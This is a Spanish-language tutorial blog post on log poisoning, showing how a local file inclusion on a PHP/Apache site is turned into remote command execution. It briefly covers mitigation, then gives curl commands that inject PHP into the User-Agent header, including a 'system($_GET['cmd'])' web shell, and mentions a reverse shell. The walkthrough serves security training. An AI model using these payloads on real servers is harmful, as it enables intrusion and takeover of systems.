---
layout: post
title: Log Poisoning (LFI -> RCE)
tags: oscp ewpt ctf PoC logpoisoning bugbounty
categories: vulnerabilities 
---

## Descripción

Log Poisoning es una técnica en que un atacante manipula los archivos de registro (logs) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad LFI para lograr una ejecución remota de comandos en el servidor.

## Mitigación

Para prevenir un ataque de Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro (logs) y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

## Explotando Log Poisoning

A continuación, se muestra que es posible visualizar el archivo de registro de apache2 y que toda petición que se haga desde la url o en el aplicativo web quedará reflejada en sus logs.

![](/assets/10/61.png)

Por ejemplo, si nosotros realizaramos una petición en donde se llama a la variable 'testing', esta se verá reflejada en los logs.

![Alt text](/assets/10/62.png)

En este ejemplo notamos que tenemos un Local File Inclusion, ya que, es posible leer archivos internos del servidor desde la página web, a continuación se muestra una lectura de logs del servidor.

![](/assets/10/63.png)

como es posible observar en los logs, se refleja la cabecera de User-Agent indicando el navegador que estamos utilizando para realizar la petición al servidor web, sin embargo, es posible alterar el valor del user agent de una forma muy sencilla utilizando CURL.

Por ejemplo, enviaremos una solicitud GET al servidor indicando una cabecera User-Agent con valor de 'test'.

~~~ ssh
curl -s X GET "http://localhost/probando" -H "User-Agent: test"
~~~

![](/assets/10/64.png)

podemos verificar que en los logs del servidor, se ha registrado la cabecera modificada con el nombre de 'test'.

![](/assets/10/65.png)

Al estar interactuando un un sitio web en PHP, veremos si es posible inyectar código PHP directamente desde la cabecera User-Agent utilizando CURL.

~~~ ssh
curl -s X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
~~~

![](/assets/10/66.png)

Al revisar nuevamente los logs, obtendremos lo siguiente:
 
![Alt text](/assets/10/67.png)

Se está interpretando el código PHP introducido en el valor de la cabecera User-Agent, dado esto, inyectaremos un parámetro llamado 'cmd' para poder ejecutar comandos desde la URL de la siguiente forma:

~~~ ssh
curl -s X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
~~~

![](/assets/img/68.png)

Ahora revisaremos nuestros logs nuevamente desde el navegador.

![Alt text](/assets/10/69.png)

Si bien no se refleja lo inyectado en la cabecera User-Agent, ahora podemos inyectar comandos desde la URL directamente, a continuación te muestro un ejemplo del uso de la variable 'cmd' desde la url con el comando 'id'.

![Alt text](/assets/10/70.png)

Ahora solo basta poner un puerto a la escucha y obtener una reverse shell. 

